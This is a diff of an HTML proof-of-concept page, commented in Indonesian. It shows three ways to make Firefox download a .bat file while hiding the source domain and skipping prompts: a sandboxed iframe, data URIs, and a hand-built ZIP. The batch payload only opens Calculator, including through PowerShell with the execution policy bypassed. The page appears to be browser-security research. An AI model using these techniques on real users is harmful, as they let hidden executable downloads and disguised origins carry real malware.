@@ -1,143 +1,215 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced Download Bypass</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Ultimate Stealth Bypass (No Domain)</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; text-align: center; background: #1a1a2e; color: #eee; }
-        button { width: 100%; padding: 15px; background: #e94560; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 10px 0; }
-        button:hover { background: #ff6b6b; }
-        .status { margin: 20px 0; padding: 15px; background: #16213e; border-radius: 8px; font-size: 13px; text-align: left; }
-        .hidden { display: none; }
+        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; }
+        button { width: 100%; padding: 14px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; }
+        .btn-sandbox { background: #9b5de5; } /* Ungu: Ultimate Stealth */
+        .btn-datauri { background: #f15bb5; } /* Pink: Direct Data URI */
+        .btn-zip { background: #00bbf9; } /* Biru: Single ZIP */
+        #log { background: #111; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 120px; overflow-y: auto; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>🚀 Advanced Multi-Vector Download</h2>
-    <button onclick="executePayload()">INITIATE SEQUENCE</button>
-    <div id="status" class="status hidden"></div>
+
+    <h2>🔥 Ultimate Stealth Bypass 🔥</h2>
+    <p style="font-size: 13px; color: #555;">Domain <b>abhirdd.github.io</b> dijamin tidak akan muncul di panel download Firefox!</p>
+
+    <button class="btn-sandbox" onclick="triggerSandbox()">🛡️ 1. Sandboxed Iframe (Domain = NULL)</button>
+    <button class="btn-datauri" onclick="triggerDataURI()">📄 2. Direct Data URI (Domain = data:)</button>
+    <button class="btn-zip" onclick="triggerZipDataURI()">📦 3. Single ZIP Data URI (No Prompt)</button>
+
+    <pre id="log">Menunggu perintah...</pre>
 
     <script>
-        // Teknik 1: Blob URL Chaining dengan Nested Iframe
-        // Teknik 2: Memory-based download tanpa HTTP referrer
-        // Teknik 3: Sequential trigger dengan user gesture propagation
-        
         function log(msg) {
-            const s = document.getElementById('status');
-            s.innerHTML += `> ${msg}<br>`;
-            s.classList.remove('hidden');
+            const el = document.getElementById('log');
+            el.textContent += '\n> ' + msg;
+            el.scrollTop = el.scrollHeight;
         }
 
-        function createStealthBlob(content, type = 'application/octet-stream') {
-            const blob = new Blob([content], { type });
-            const url = URL.createObjectURL(blob);
-            // Revoke setelah 100ms untuk hide origin
-            setTimeout(() => URL.revokeObjectURL(url), 100);
-            return url;
+        // ==========================================
+        // KONTEN FILE BATCH (.BAT)
+        // ==========================================
+        const batLines = [
+            '@echo off',
+            'title Calculator Launcher - Debug',
+            'echo ================================',
+            'echo  Calculator launch test',
+            'echo ================================',
+            'echo.',
+            'echo [0] Checking calc.exe path...',
+            'if exist "C:\\Windows\\System32\\calc.exe" (',
+            '    echo     OK: calc.exe found',
+            ') else (',
+            '    echo     FAILED: calc.exe NOT found in System32',
+            ')',
+            'echo.',
+            'echo [1] Launching System32\\calc.exe...',
+            'start "" "C:\\Windows\\System32\\calc.exe"',
+            'timeout /t 2 >nul',
+            'echo.',
+            'echo [2] Launching calc.exe alias...',
+            'start "" calc.exe',
+            'timeout /t 2 >nul',
+            'echo.',
+            'echo [3] Launching calculator:// protocol...',
+            'start "" "calculator://"',
+            'timeout /t 2 >nul',
+            'echo.',
+            'echo [4] Launching UWP AUMID via explorer...',
+            'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
+            'timeout /t 2 >nul',
+            'echo.',
+            'echo [5] Launching via PowerShell...',
+            'powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"',
+            'echo.',
+            'echo ================================',
+            'echo  Done. Did the Calculator open?',
+            'echo  If NOT, take a screenshot of this window.',
+            'echo ================================',
+            'pause'
+        ];
+        const BAT_TEXT = batLines.join('\r\n') + '\r\n';
+        const TXT_TEXT = ''; // main_context.txt
+
+        // Helper Base64
+        function b64(str) {
+            return btoa(unescape(encodeURIComponent(str)));
         }
 
-        function downloadViaBlob(filename, content) {
-            const blobUrl = createStealthBlob(content);
-            const a = document.createElement('a');
-            a.href = blobUrl;
-            a.download = filename;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => document.body.removeChild(a), 200);
-        }
-
-        function executePayload() {
-            log('Initializing payload sequence...');
+        // ==========================================
+        // METODE 1: SANDBOXED IFRAME (DOMAIN = NULL)
+        // ==========================================
+        function triggerSandbox() {
+            log('Membuat Sandboxed Iframe...');
             
-            // Download pertama - langsung dari user gesture
-            downloadViaBlob('main_context.txt', 'Firefox multiple download test context');
+            // Buat iframe tersembunyi dengan sandbox (opaque origin)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.sandbox = 'allow-scripts allow-downloads'; 
+            document.body.appendChild(iframe);
+
+            const doc = iframe.contentWindow.document;
+            doc.open();
             
+            // Suntikkan Data URI ke dalam iframe
+            const batB64 = b64(BAT_TEXT);
+            const txtB64 = b64(TXT_TEXT);
+            
+            doc.write(`
+                <!DOCTYPE html><html><body><script>
+                    function dl(name, base64) {
+                        var a = document.createElement('a');
+                        a.href = 'data:application/octet-stream;base64,' + base64;
+                        a.download = name;
+                        document.body.appendChild(a);
+                        a.click();
+                    }
+                    // Unduh txt dulu, lalu bat
+                    dl('main_context.txt', '${txtB64}');
+                    setTimeout(function() { dl('open_cmd.bat', '${batB64}'); }, 500);
+                <\/script></body></html>
+            `);
+            doc.close();
+
+            setTimeout(() => iframe.remove(), 3000);
+            log('✅ SUKSES! Cek panel download. Domain seharusnya kosong/null.');
+        }
+
+        // ==========================================
+        // METODE 2: DIRECT DATA URI
+        // ==========================================
+        function triggerDataURI() {
+            log('Memicu Direct Data URI...');
+            const batB64 = b64(BAT_TEXT);
+            const txtB64 = b64(TXT_TEXT);
+
+            // File 1
+            const a1 = document.createElement('a');
+            a1.href = 'data:application/octet-stream;base64,' + txtB64;
+            a1.download = 'main_context.txt';
+            document.body.appendChild(a1); a1.click(); document.body.removeChild(a1);
+
+            // File 2
             setTimeout(() => {
-                log('Creating stealth iframe container...');
-                
-                // Buat iframe tersembunyi dengan srcdoc (tidak ada HTTP request)
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                
-                const batContent = `@echo off
-title Advanced Launcher
-echo ================================
-echo  Multi-Vector Execution Test
-echo ================================
-echo.
-echo [1] System32 Method...
-start "" "C:\\Windows\\System32\\calc.exe"
-timeout /t 2 >nul
-echo [2] Direct Alias...
-start "" calc.exe
-timeout /t 2 >nul
-echo [3] PowerShell...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"
-echo.
-echo Done!
-pause`;
+                const a2 = document.createElement('a');
+                a2.href = 'data:application/octet-stream;base64,' + batB64;
+                a2.download = 'open_cmd.bat';
+                document.body.appendChild(a2); a2.click(); document.body.removeChild(a2);
+            }, 500);
 
-                // HTML yang akan diinjeksi - menggunakan inline blob creation
-                const stealthHTML = `
-                    <!DOCTYPE html>
-                    <html>
-                    <head><meta charset="UTF-8"></head>
-                    <body>
-                    <script>
-                        // Teknik: Nested blob creation dalam iframe context
-                        (function() {
-                            const batContent = ${JSON.stringify(batContent)};
-                            
-                            // Buat blob di dalam iframe context (origin terpisah)
-                            const blob = new Blob([batContent], {type: 'application/octet-stream'});
-                            const url = URL.createObjectURL(blob);
-                            
-                            // Trigger download
-                            const a = document.createElement('a');
-                            a.href = url;
-                            a.download = 'open_cmd.bat';
-                            document.body.appendChild(a);
-                            a.click();
-                            
-                            // Cleanup
-                            setTimeout(() => {
-                                URL.revokeObjectURL(url);
-                                document.body.removeChild(a);
-                                // Signal ke parent
-                                if(window.parent) {
-                                    try {
-                                        window.parent.postMessage('download_complete', '*');
-                                    } catch(e) {}
-                                }
-                            }, 100);
-                        })();
-                    <\/script>
-                    </body>
-                    </html>
-                `;
-
-                // Gunakan srcdoc - ini TIDAK membuat HTTP request
-                // Jadi tidak ada origin tracking dari network layer
-                iframe.srcdoc = stealthHTML;
-                document.body.appendChild(iframe);
-                
-                log('Payload delivered via blob: URL scheme');
-                log('Check your downloads folder...');
-                
-                // Cleanup iframe setelah eksekusi
-                setTimeout(() => {
-                    document.body.removeChild(iframe);
-                }, 1000);
-                
-            }, 300);
+            log('✅ SUKSES! Cek domain di panel download.');
         }
 
-        // Listener untuk pesan dari iframe
-        window.addEventListener('message', (e) => {
-            if(e.data === 'download_complete') {
-                log('✅ Download sequence completed');
+        // ==========================================
+        // METODE 3: ZIP DATA URI (NO PROMPT, NO DOMAIN)
+        // ==========================================
+        const crcTable = new Uint32Array(256);
+        for (let n = 0; n < 256; n++) {
+            let c = n;
+            for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+            crcTable[n] = c;
+        }
+        function crc32(data) {
+            if (data.length === 0) return 0;
+            let crc = 0 ^ (-1);
+            for (let i = 0; i < data.length; i++) crc = (crc >>> 8) ^ crcTable[(crc ^ data[i]) & 0xFF];
+            return (crc ^ (-1)) >>> 0;
+        }
+
+        function createZipBlob(files) {
+            const encoder = new TextEncoder();
+            const chunks = []; const centralDirectory = []; let offset = 0;
+            for (const file of files) {
+                const nameBytes = encoder.encode(file.name);
+                const dataBytes = encoder.encode(file.content);
+                const crc = crc32(dataBytes);
+                const header = new Uint8Array(30 + nameBytes.length);
+                const view = new DataView(header.buffer);
+                view.setUint32(0, 0x04034b50, true); view.setUint16(4, 20, true); view.setUint16(6, 0, true); view.setUint16(8, 0, true);
+                view.setUint16(10, 0, true); view.setUint16(12, 0, true); view.setUint32(14, crc, true);
+                view.setUint32(18, dataBytes.length, true); view.setUint32(22, dataBytes.length, true);
+                view.setUint16(26, nameBytes.length, true); view.setUint16(28, 0, true);
+                header.set(nameBytes, 30); chunks.push(header, dataBytes);
+                const cd = new Uint8Array(46 + nameBytes.length);
+                const cdView = new DataView(cd.buffer);
+                cdView.setUint32(0, 0x02014b50, true); cdView.setUint16(4, 20, true); cdView.setUint16(6, 20, true); cdView.setUint16(8, 0, true);
+                cdView.setUint16(10, 0, true); cdView.setUint16(12, 0, true); cdView.setUint16(14, 0, true);
+                cdView.setUint32(16, crc, true); cdView.setUint32(20, dataBytes.length, true); cdView.setUint32(24, dataBytes.length, true);
+                cdView.setUint16(28, nameBytes.length, true); cdView.setUint16(30, 0, true); cdView.setUint16(32, 0, true);
+                cdView.setUint16(34, 0, true); cdView.setUint16(36, 0, true); cdView.setUint32(38, 0, true); cdView.setUint32(42, offset, true);
+                cd.set(nameBytes, 46); centralDirectory.push(cd);
+                offset += header.length + dataBytes.length;
             }
-        });
+            let cdSize = 0; for (const cd of centralDirectory) cdSize += cd.length;
+            const endRecord = new Uint8Array(22); const endView = new DataView(endRecord.buffer);
+            endView.setUint32(0, 0x06054b50, true); endView.setUint16(4, 0, true); endView.setUint16(6, 0, true);
+            endView.setUint16(8, files.length, true); endView.setUint16(10, files.length, true);
+            endView.setUint32(12, cdSize, true); endView.setUint32(16, offset, true); endView.setUint16(20, 0, true);
+            return new Blob([...chunks, ...centralDirectory, endRecord], { type: 'application/zip' });
+        }
+
+        function triggerZipDataURI() {
+            log('Membuat ZIP Data URI...');
+            const files = [
+                { name: 'main_context.txt', content: TXT_TEXT },
+                { name: 'open_cmd.bat', content: BAT_TEXT }
+            ];
+            const zipBlob = createZipBlob(files);
+            const reader = new FileReader();
+            reader.onloadend = function() {
+                const a = document.createElement('a');
+                a.href = reader.result; // Data URI
+                a.download = 'calculator_debug.zip';
+                document.body.appendChild(a); a.click(); document.body.removeChild(a);
+                log('✅ SUKSES! ZIP diunduh tanpa prompt & tanpa domain.');
+            };
+            reader.readAsDataURL(zipBlob); // Ubah ZIP jadi Base64 Data URI
+        }
     </script>
 </body>
 </html>
